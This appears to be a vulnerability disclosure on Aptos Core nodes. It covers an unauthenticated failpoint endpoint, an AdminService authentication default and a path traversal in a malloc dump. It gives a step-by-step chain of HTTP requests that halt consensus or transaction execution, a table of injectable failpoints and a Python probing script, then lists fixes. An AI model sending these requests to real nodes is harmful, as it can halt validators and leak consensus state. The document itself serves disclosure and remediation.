# Aptos Core — Failpoint Injection Attack Chain

## Summary

Aptos Core nodes compiled with `--features failpoints` expose an unauthenticated HTTP endpoint (`GET /v1/set_failpoint`) that allows arbitrary runtime behavior injection at 46+ critical code paths including consensus message sending, transaction execution, and block processing.

Combined with the AdminService authentication bypass (empty `authentication_configs` defaults to `authenticated = true`), this enables a single HTTP request to halt a validator's consensus participation.

## The Chain

### Vector A: Failpoint Injection (Behavior RCE)

```
Step 1: Discover node with failpoints enabled
  → GET /v1/set_failpoint?name=test&actions=off
  → 200 OK + "Set failpoint test" = feature enabled

Step 2: Inject failpoint at consensus layer
  → GET /v1/set_failpoint?name=consensus::send::any&actions=panic
  → All consensus P2P messages now trigger panic()
  → Validator stops participating in consensus

Step 3: Escalate to VM layer
  → GET /v1/set_failpoint?name=aptos_vm::execute_script_or_entry_function&actions=return
  → All transaction executions return early (no-op)
  → Chain stops processing transactions
```

### Vector B: Admin Service Auth Bypass

```
Step 1: AdminService starts when authentication_configs is empty
  → config/admin_service_config.rs: if empty → authenticated = true
  → Sanitizer only requires auth on mainnet (admin_service_config.rs:72)
  → Testnet/staging/devnet: NO AUTH REQUIRED

Step 2: Access diagnostic endpoints
  → GET /profilez?seconds=300 → CPU profiling DoS (5 min at high freq)
  → GET /threadz?snapshot=true → Thread dump + binary path leak
  → GET /debug/consensus/consensusdb → Full consensus state dump
  → GET /malloc/dump_profile?output=../../path/file → Path traversal file write
```

## 46+ Failpoint Sites (Categorized)

### Consensus Layer (Critical)
| Failpoint Name | Effect | Impact |
|----------------|--------|--------|
| `consensus::send::any` | Drop ALL consensus messages | Validator isolation |
| `consensus::send::block_retrieval` | Drop block retrievals | Sync failure |
| `consensus::send::broadcast_epoch_change` | Drop epoch changes | Epoch stall |
| `consensus::process_proposal_msg` | Ignore all proposals | Liveness loss |
| `consensus::process_vote_msg` | Ignore all votes | Consensus halt |
| `consensus::process_sync_info_msg` | Drop sync info | Fork choice corruption |
| `consensus::process_round_timeout_msg` | Ignore timeouts | Round stall |
| `consensus::create_invalid_vote` | Inject invalid votes | Safety violation |
| `consensus::create_invalid_commit_vote` | Inject invalid commits | Safety violation |
| `consensus::ordered_only_cert` | Break ordering | Consensus corruption |
| `consensus::inject_reconfiguration_error` | Force reconfig error | Epoch disruption |
| `consensus::pull_payload` | Drop payload retrieval | Data unavailability |
| `consensus::rand::corrupt_share` | Corrupt randomness | DKG compromise |
| `consensus::process::any` | Global process hook | Any consensus action |
| `consensus::process_opt_proposal_msg` | Ignore optimistic proposals | Opt-round disruption |
| `consensus::process_order_vote_msg` | Ignore order votes | Ordering failure |

### VM Execution Layer (Critical)
| Failpoint Name | Effect | Impact |
|----------------|--------|--------|
| `aptos_vm::execute_script_or_entry_function` | Halt all tx execution | Chain freeze |
| `aptos_vm::execution::block_metadata` | Skip block metadata | State corruption |
| `aptos_vm::execution::block_metadata_ext` | Skip block metadata ext | State corruption |
| `aptos_vm::execution::user_transaction` | Skip user tx processing | No user txns |
| `aptos_vm::vm_wrapper::execute_transaction` | VM wrapper bypass | Execution skip |
| `aptos_vm_block_executor::execute_block_with_config` | Block executor halt | Block processing freeze |
| `move_adapter::execute_multisig_transaction` | Skip multisig | Multisig bypass |
| `move_adapter::process_block_prologue` | Skip prologue | Prologue bypass |
| `move_adapter::process_block_prologue_ext` | Skip prologue ext | Prologue bypass |
| `move_adapter::run_success_epilogue` | Skip epilogue | Epilogue bypass |

### Mempool & State Sync
| Failpoint Name | Effect | Impact |
|----------------|--------|--------|
| `abort-manager-start-abort-none` | Break abort handling | Abort corruption |
| `abort-manager-start-abort-some` | Break abort handling | Abort corruption |
| `commit-all-halt-err` | Halt state commitment | State freeze |
| `fail-point-resource-group-serialization` | Break RG serialization | RG corruption |
| `value_with_layout_bytes_len` | Corrupt value layout | Storage corruption |

### DKG & Key Management
| Failpoint Name | Effect | Impact |
|----------------|--------|--------|
| `chunky_dkg::process_dkg_start_event` | Disrupt DKG ceremony | Key generation failure |

## Code Evidence

### 1. Failpoint Endpoint (No Auth)
**File:** `api/src/set_failpoints.rs` lines 21-39
```rust
#[cfg(feature = "failpoints")]
#[handler]
pub fn set_failpoint_poem(
    context: Data<&std::sync::Arc<Context>>,
    Query(failpoint_conf): Query<FailpointConf>,
) -> poem::Result<String> {
    if context.failpoints_enabled() {
        fail::cfg(&failpoint_conf.name, &failpoint_conf.actions)
            .map_err(|e| poem::Error::from(anyhow::anyhow!(e)))?;
        Ok(format!("Set failpoint {}", failpoint_conf.name))
    }
```

### 2. Route Registration (No Middleware)
**File:** `api/src/runtime.rs` lines 249-252
```rust
.at(
    "/set_failpoint",
    poem::get(set_failpoints::set_failpoint_poem).data(context.clone()),
),
// No AuthMiddleware. No rate limiting. No authorization check.
```

### 3. AdminService Auth Bypass
**File:** `crates/aptos-admin-service/src/server/mod.rs` lines 154-156
```rust
let mut authenticated = false;
if context.config.authentication_configs.is_empty() {
    authenticated = true;  // ← NO AUTH WHEN CONFIG EMPTY
}
```

### 4. Config Sanitizer Only Blocks Mainnet
**File:** `config/src/config/api_config.rs` lines 178-184
```rust
if let Some(chain_id) = chain_id {
    if chain_id.is_mainnet() && api_config.failpoints_enabled {
        return Err(Error::ConfigSanitizerFailed(
            sanitizer_name,
            "Failpoints are not supported on mainnet nodes!".into(),
        ));
    }
}
// → Testnet/staging/devnet: FAILPOINTS ALLOWED
```

### 5. Admin Auth Only Required on Mainnet
**File:** `config/src/config/admin_service_config.rs` lines 70-77
```rust
if let Some(chain_id) = chain_id {
    if chain_id.is_mainnet()
        && node_config.admin_service.authentication_configs.is_empty()
    {
        return Err(Error::ConfigSanitizerFailed(
            sanitizer_name,
            "Must enable authentication for AdminService on mainnet.".into(),
        ));
    }
}
// → Non-mainnet: NO AUTH REQUIRED
```

### 6. Path Traversal in malloc dump
**File:** `crates/aptos-admin-service/src/server/malloc.rs` lines 74-91
```rust
fn validate_output_path(path: &str) -> Result<(), String> {
    let p = Path::new(path);
    if p.exists() {
        return Err(format!("output path '{path}' already exists"));
    }
    if let Some(parent) = p.parent()
        && !parent.as_os_str().is_empty()
        && !parent.exists()
    {
        return Err(format!("parent directory does not exist"));
    }
    Ok(())
}
// ← NO CHECK FOR ".." TRAVERSAL
// ← ../../any/accessible/dir/newfile passes validation
```

### 7. Config Sanitizer Backdoor
**File:** `config/src/config/config_sanitizer.rs` lines 45-48
```rust
if node_config.node_startup.skip_config_sanitizer {
    return Ok(());  // ← SKIP ALL SANITIZERS
}
```
**File:** `config/src/config/node_startup_config.rs` lines 8-10
```rust
pub struct NodeStartupConfig {
    pub skip_config_sanitizer: bool, // ← BACKDOOR FLAG
```

This allows operators (or attackers who can modify config) to bypass ALL protections including mainnet-only failpoint blocking and admin auth requirements.

## Available `fail::cfg` Actions

The `fail` crate supports these actions (passed via `actions` query param):

| Action | Syntax | Effect |
|--------|--------|--------|
| `off` | `actions=off` | Disable failpoint |
| `panic` | `actions=panic` | Panic the thread |
| `return` | `actions=return` | Return default value (early exit) |
| `return(value)` | `actions=return("error")` | Return specific value |
| `sleep(ms)` | `actions=sleep(5000)` | Sleep for N milliseconds |
| `count(N)` | `actions=count(10)` | Trigger N times then disable |
| `when(N)` | `actions=when(3)` | Trigger on Nth call |

## PoC Script

```python
#!/usr/bin/env python3
"""Aptos Core — Unauthenticated Failpoint Injection + Admin Abuse"""
import sys, requests, time

def main():
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <NODE_HOST> [PORT=8080]")
        sys.exit(1)
    host = sys.argv[1]
    port = sys.argv[2] if len(sys.argv) > 2 else "8080"
    base = f"http://{host}:{port}"
    s = requests.Session()
    s.headers.update({"User-Agent": "Aptos-CDC-Audit/1.0"})

    print(f"[*] Targeting {base}")

    # Phase 1: Admin Service Auth Bypass
    print("\n[Phase 1] Testing AdminService auth bypass...")
    r = s.get(f"{base}/profilez?seconds=1&frequency=99")
    if r.status_code == 200:
        print(f"    ✅ /profilez accessible (no auth) — {len(r.content)} bytes")
    elif r.status_code == 511:
        print(f"    ❌ /profilez requires auth (passcode)")
    else:
        print(f"    ? /profilez returned {r.status_code}")

    # Phase 2: Failpoint Injection
    print("\n[Phase 2] Testing failpoint injection...")
    r = s.get(f"{base}/v1/set_failpoint?name=test&actions=off")
    if r.status_code == 200 and "Set failpoint" in r.text:
        print(f"    ✅ Failpoints ENABLED — can inject at 46+ sites")
        print(f"    ⚠️  CRITICAL: Single request can halt consensus")
    elif "Failpoints are not enabled" in r.text:
        print(f"    ❌ Failpoints disabled at config level")
    else:
        print(f"    ? Returned {r.status_code}: {r.text[:200]}")

    # Phase 3: Consensus DB Dump
    print("\n[Phase 3] Testing consensus DB access...")
    r = s.get(f"{base}/debug/consensus/consensusdb")
    if r.status_code == 200 and len(r.content) > 100:
        print(f"    ✅ Consensus DB dumped — {len(r.content)} bytes")
        print(f"    📋 Contains: last vote, highest TC, blocks, QCs")
    else:
        print(f"    ? Consensus DB returned {r.status_code}")

    # Phase 4: Thread Dump (info leak)
    print("\n[Phase 4] Testing thread dump...")
    r = s.get(f"{base}/threadz?snapshot=false&verbose=false")
    if r.status_code == 200:
        lines = r.text.count("Thread")
        print(f"    ✅ Thread dump — {lines} threads, {len(r.content)} bytes")
    else:
        print(f"    ? Thread dump returned {r.status_code}")

    print("\n[Done]")

if __name__ == "__main__":
    main()
```

## Impact Assessment

| Target | Condition | Impact | Severity |
|--------|-----------|--------|----------|
| Validator (failpoints + no auth) | Default testnet config | Consensus halt via single HTTP request | CRITICAL |
| Validator (no auth only) | Default testnet config | Consensus state leak, profiling DoS, file write | HIGH |
| Full node (failpoints enabled) | Dev/staging config | Transaction processing halt | HIGH |
| Mainnet validator | Sanitizer blocks failpoints | Protected (unless skip_config_sanitizer=true) | MITIGATED |

**Blast radius:** Single unauthenticated HTTP request can:
- Halt validator consensus participation
- Drop all P2P consensus messages
- Freeze transaction execution chain-wide
- Leak consensus state (votes, blocks, QCs)
- Cause resource exhaustion via profiling

## Mitigation

1. **Remove `/set_failpoint` from production route tree**
   ```rust
   // Only expose in test binaries, not aptos-node
   ```

2. **Require authentication for ALL admin/debug endpoints**
   ```rust
   // Change default: authenticated = false when auth_configs empty
   // Make auth MANDATORY regardless of chain_id
   ```

3. **Add authorization middleware to failpoint endpoint**
   ```rust
   .with(AuthMiddleware::new())  // ADD THIS
   ```

4. **Fix path traversal in malloc dump**
   ```rust
   fn validate_output_path(path: &str) -> Result<(), String> {
       let p = Path::new(path);
       if p.is_absolute() || p.components().any(|c| c.as_os_str() == "..") {
           return Err("output path must be relative and contain no traversal".into());
       }
       // ... existing checks
   }
   ```

5. **Default-deny admin service**
   ```rust
   // Change default: enabled = Some(false)
   // Operators must explicitly enable + configure auth
   ```

6. **Remove `skip_config_sanitizer` backdoor**
   ```rust
   // Remove NodeStartupConfig::skip_config_sanitizer entirely
   // Or make it require compile-time flag, not runtime config
   ```

## Confidence

| Finding | Confidence | Evidence |
|---------|-----------|----------|
| AdminService auth bypass | PROVEN | mod.rs:154-156 |
| Failpoint injection endpoint | PROVEN | set_failpoints.rs:21-39 |
| 46+ failpoint sites | PROVEN | grep-verified across codebase |
| Path traversal in malloc dump | PROVEN | malloc.rs:74-91 (no `..` check) |
| Mainnet-only sanitizer | PROVEN | api_config.rs:178-184 |
| Config sanitizer backdoor | PROVEN | config_sanitizer.rs:45-48 |
| Real-world exploitability | HIGH | Testnet/staging default config |

## References

- Aptos Core mainnet branch: https://github.com/aptos-labs/aptos-core/tree/mainnet
- `fail` crate documentation: https://docs.rs/fail/
- `fail` crate actions: https://docs.rs/fail/latest/fail/#actions
- Aptos AdminService: `crates/aptos-admin-service/src/server/mod.rs`
- Aptos API runtime: `api/src/runtime.rs`
- Aptos config sanitizer: `config/src/config/config_sanitizer.rs`
